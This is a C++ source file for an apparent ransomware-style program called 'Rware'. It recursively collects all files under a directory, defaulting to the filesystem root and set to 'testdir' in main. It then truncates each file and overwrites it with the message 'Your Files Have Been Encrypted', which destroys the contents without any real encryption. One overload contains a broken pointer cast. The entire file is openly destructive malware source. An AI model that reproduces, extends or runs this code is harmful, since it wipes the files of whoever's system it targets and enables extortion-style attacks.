#include <iostream>
#include <experimental/filesystem>
#include <string>
#include <fstream>
#include <vector>
#include <dirent.h>
#include <sys/stat.h>

using namespace std;
using experimental::filesystem::path;

//-std=c++17 -lstdc++fs

struct Message{
    string m;
}msg{"Your Files Have Been Encrypted"};

void ProcessDirectory(string path,string directory,vector<string>* v);
void ProcessEntity(struct dirent* entity,string& path,vector<string>* v);

void ProcessDirectory(string path,string directory,vector<string>* v)
{
    string dirToOpen = path + directory;
    auto dir = opendir(dirToOpen.c_str());

    path = dirToOpen + "/";

    v->push_back(dirToOpen.c_str());

    auto entity = readdir(dir);

    while(entity != NULL){
        ProcessEntity(entity,path,v);
        entity = readdir(dir);
    }
    path.resize(path.length() - 1 - directory.length());
    closedir(dir);
}
void ProcessEntity(struct dirent* entity,string& path,vector<string>* v)
{
    if(entity->d_type == DT_DIR){
        if(entity->d_name[0] == '.'){
            return;
        }
        ProcessDirectory(path,string(entity->d_name),v);
        return;
    }
}

class Rware{
    private:
        string dirPath = "";
        path mainDirectory = "/";
        vector<experimental::filesystem::directory_entry>* targetFiles = new vector<experimental::filesystem::directory_entry>;
        vector<string>* targetDirs = new vector<string>;

    public:
        Rware() = default; //Default Constructor :: mainDirectory will be '/'

        Rware(path mainDirectory){ //Constructor with parameter :: mainDirectory will be specified 
            this->mainDirectory = mainDirectory; 
        }
        bool is_file(experimental::filesystem::file_status sts){
            //If given path is not a directory return TRUE
            if(!experimental::filesystem::is_directory(sts)){
                return true;
            }
            else{
                return false;
            }
        }
        void fill_dirs(){
            ProcessDirectory(dirPath,mainDirectory,targetDirs);
        }
        void fill_targets(path dir){ // Filling targetDirs and targetFiles
            for(experimental::filesystem::directory_entry p : experimental::filesystem::directory_iterator(dir)){
                if(is_file(experimental::filesystem::status(p.path()))){ // If it's not a directory
                    targetFiles->push_back(p);
                }
            }
        } 
        void list(){ // Print files
            for(vector<experimental::filesystem::directory_entry>::iterator it=targetFiles->begin();it!=targetFiles->end();it++){
                cout << it->path() << endl;
            }
        }
        void encrypt(path file_path){ // Encrypt the specified file without a message!
            fstream encFile;
            encFile.open(file_path,fstream::binary|fstream::out);
            if(encFile.is_open()){
                encFile.write(reinterpret_cast<char *>('1'), sizeof(char));
            }
            encFile.close();
        }
        void encrypt(path file_path,Message& message){ // Encrypt the specified file and put a message on it! 
            fstream encFile;
            encFile.open(file_path,fstream::binary|fstream::out);
            if(encFile.is_open()){
                encFile.write(reinterpret_cast<char *>(&message), sizeof(Message));
            }
            encFile.close();
        }
        void run(){ //For in target files and call encrypt on them  
            fill_dirs();
            for(vector<string>::iterator it=targetDirs->begin();it!=targetDirs->end();it++){
                fill_targets(*it);
            }
            for(vector<experimental::filesystem::directory_entry>::iterator it=targetFiles->begin();it!=targetFiles->end();it++){
                encrypt(it->path(),msg);
            }
            
        }
        ~Rware(){ // Deleting Objects
            delete targetDirs;
            delete targetFiles;
        }
};


int main(){
    Rware* rware = new Rware("testdir");

    rware->run();

    delete rware;

    return 0;
}
